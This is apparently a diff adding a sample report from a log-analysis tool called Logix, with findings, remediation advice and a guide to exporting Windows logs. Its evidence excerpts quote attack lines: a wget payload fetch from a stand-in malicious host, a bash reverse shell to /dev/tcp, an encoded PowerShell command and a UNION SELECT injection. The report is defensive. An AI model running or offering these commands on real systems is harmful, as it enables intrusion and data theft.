@@ -1,0 +1,84 @@
+=== Logix Report ===
+Analyzed at (UTC): 2025-09-13T18:34:42.191376Z
+Total lines processed: 5
+
+SUMMARY:
+Suspicious Download / Binary Fetch (confidence 0.84)
+
+DETAILED FINDINGS:
+------------------------------------------------------------
+Name: Suspicious Download / Binary Fetch
+Severity: 9
+Confidence: 0.84
+Count: 2
+Suggested Remediation:
+  - Isolate host immediately and scan binaries offline.
+  - Block the source domain and remove malicious files.
+Immediate Precaution: Do not execute suspicious files; collect for AV analysis.
+Evidence (excerpt):
+  line 3: Sep 12 11:06:00 client powershell.exe -EncodedCommand QWJjMTIz
+  line 4: Sep 12 11:10:45 system wget http://malicious.com/payload.sh
+
+------------------------------------------------------------
+Name: Command Injection / Reverse Shell
+Severity: 10
+Confidence: 0.7
+Count: 1
+Suggested Remediation:
+  - Disconnect host from network, collect memory image.
+  - Perform full incident response and root cause analysis.
+Immediate Precaution: Treat system as compromised until proven clean.
+Evidence (excerpt):
+  line 5: Sep 12 11:15:12 system /bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+
+------------------------------------------------------------
+Name: Authentication Failures / Brute-force
+Severity: 8
+Confidence: 0.63
+Count: 1
+Suggested Remediation:
+  - Block offending IP(s). Enable MFA and account lockout.
+  - Reset targeted accounts and rotate credentials.
+Immediate Precaution: If confirmed, isolate host and check for backdoors.
+Evidence (excerpt):
+  line 1: Sep 12 11:02:12 server sshd[1001]: Failed password for invalid user root from 192.168.1.25 port 4455
+
+------------------------------------------------------------
+Name: Possible SQL Injection
+Severity: 8
+Confidence: 0.63
+Count: 1
+Suggested Remediation:
+  - Sanitize inputs and use parameterized queries.
+  - Apply WAF rules and review DB logs.
+Immediate Precaution: Check database for suspicious queries and exports.
+Evidence (excerpt):
+  line 2: Sep 12 11:05:00 webserver GET /index.php?id=1 UNION SELECT user, pass FROM users
+
+
+
+---------------------------- USER GUIDE: How to export Windows logs (for beginners) ----------------------------
+1) Using Event Viewer (GUI):
+   - Press Windows key, type 'Event Viewer' and open it.
+   - In left panel expand 'Windows Logs' and select one (Application, Security, System).
+   - On the right 'Actions' pane click 'Save All Events As...'
+   - Save as .evtx (recommended). To use with Logix, open PowerShell and run:
+       Get-WinEvent -Path C:\path\to\your.evtx | Format-List | Out-File -FilePath C:\path\to\exported.txt -Encoding utf8
+
+2) Using PowerShell (fast):
+   - Example (export last day's system events to text):
+       Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddDays(-1)} | Format-List | Out-File -FilePath C:\path\to\system_lastday.txt -Encoding utf8
+
+3) If you cannot use EVTX:
+   - Copy the log text from tools / console and save as .txt, then upload.
+
+Precautions:
+ - Do not upload full disk images; only export text/event logs.
+ - If you suspect compromise, isolate the machine before exporting logs.
+ - Share reports only with trusted responders.
+---------------------------------------------------------------------------------------------------------------
+
+IMMEDIATE PRECAUTIONS:
+- If a compromise is suspected: disconnect the device from the network immediately.
+- Preserve evidence: do not reboot the host if possible; collect logs/images only by trained personnel.
+- Change passwords for affected accounts from a separate clean device.
